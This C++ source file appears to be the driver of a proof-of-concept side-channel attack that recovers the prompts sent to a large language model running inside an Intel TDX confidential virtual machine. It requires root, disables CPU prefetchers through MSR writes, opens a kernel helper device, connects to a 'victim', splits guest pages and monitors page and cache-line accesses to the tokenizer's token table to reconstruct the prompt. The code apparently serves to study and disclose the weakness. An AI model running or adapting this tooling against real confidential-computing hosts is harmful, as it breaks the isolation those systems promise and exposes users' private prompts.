#include "ttoolbox.h"
#include <cstdio>
#include <cstddef>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <fcntl.h>
#include <vector>
#include <iterator>

#include "tdxutils.h"
#include "gpa-sync.h"
#include "libtokenize.h"
#include "sequence-analysis.h"
#include "recovery.h"

#ifndef PAGE_SIZE
#define PAGE_SIZE 0x1000
#endif
#define CL_SIZE 0x40ul


#define test_prompt "This is a short test prompt. Please reply with 'received'."

unsigned long tdr_pa = ~0ul;
static bool verbose = false;

static void disable_prefetchers() {
    auto num_cores = get_core_count();
    for (auto i = 0u; i < num_cores; i++)
        write_msr(i, 0x1a4, 0xf);
}

static void print_expected_access_pattern(const std::vector<std::pair<std::string, unsigned long> > &accesses) {
    printf("Expecting the following accesses:\n");
    for (const auto &p: accesses) {
        auto t = id_to_token.find(p.second);
        if (t == id_to_token.end())
            continue;
        printf("Page 0x%lx - Cache Line 0x%lx - ID (%lu) (%s)\n", t->second.gpa >> 12, (t->second.gpa >> 6) & 0x3f,
               p.second, t->second.token_string);
    }
}

int main(int argc, char *argv[]) {
    const char* prompt = test_prompt;

    if (getuid() != 0) {
        printf("I need root privileges\n");
        exit(EXIT_FAILURE);
    }

    if (argc < 2) {
        printf("Usage: %s <model.gguf> -p <prompt_file> [-v]\n", argv[0]);
        return 1;
    }

    toggle_stderr();
    auto status = libtokenize_init(argv[1]);
    toggle_stderr();
    if (status < 0) {
        printf("Could not initialize tokenizer library\n");
        return 1;
    }

    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-v") == 0)
            verbose = true;
    }

    // Load prompt file if specified
    for (int i = 2; i < argc - 1; i++) {
        if (strcmp(argv[i], "-p") != 0)
            continue;

        const auto* prompt_fn = argv[++i];
        const auto f = fopen(prompt_fn, "r");
        if (!f)
            continue;
        fseek(f, 0, SEEK_END);
        const auto flen = ftell(f);
        const auto prompt_dest = new char [flen + 1];
        rewind(f);
        fread(prompt_dest, sizeof(*prompt_dest), flen, f);
        fclose(f);
        prompt = prompt_dest;
    }

    disable_prefetchers();

    auto util_fd = open("/dev/" TDXUTILS_DEVICE_NAME, O_RDWR);
    if (util_fd < 0) {
        perror("open /dev/" TDXUTILS_DEVICE_NAME);
        exit(EXIT_FAILURE);
    }

    tdr_pa = get_tdr_pa(util_fd);

    auto victim_fd = connect_to_victim();
    if (victim_fd < 0)
        exit(EXIT_FAILURE);

    auto *token_sync = get_token_addresses(victim_fd);
    printf("Sync Page @ %lx, Termination Page @ %lx\n", token_sync->tokenizer_code_gpa, token_sync->sampling_code_gpa);
    init_tokens(token_sync, verbose);
    delete [] token_sync;

    auto num_pages_split = split_target_pages(util_fd, target_gpas);
    if (num_pages_split != 0) {
        printf("Split %u 2MB guest pages\n", num_pages_split);
        if (!verify_target_page_level(util_fd, target_gpas)) {
            fprintf(stderr, "Could not split target pages\n");
            exit(EXIT_FAILURE);
        }
    }

    int32_t *tokens = NULL;
    char* prompt_with_headers = new char[strlen(target_model->start_header) + strlen(prompt) + strlen(target_model->end_header) + 1];
    strcpy(prompt_with_headers, target_model->start_header);
    strcat(prompt_with_headers, prompt);
    strcat(prompt_with_headers, target_model->end_header);
    auto num_tokens = libtokenize_get_tokens(prompt_with_headers, &tokens);
    delete [] prompt_with_headers;
    init_correct_tokens(tokens, num_tokens);

    std::vector<tdx_access_monitor_hit> accesses;
    monitor_all_tokens(util_fd, victim_fd, prompt, accesses);
    std::vector<page_accesses> access_trace;
    extract_prompt(accesses, verbose, access_trace);

    printf("Raw:\n" CRED);
    print_decoded_accesses(access_trace);
    printf(CRESET "\n");
    fflush(stdout);

    auto isolated_accesses = isolate_prompt(access_trace, verbose);
    printf("Isolated:\n" CONG);
    print_decoded_accesses(isolated_accesses);
    printf(CRESET "\n");
    fflush(stdout);

    libtokenize_free_tokens(tokens);
    libtokenize_exit();
    close(victim_fd);
    close(util_fd);
    return 0;
}
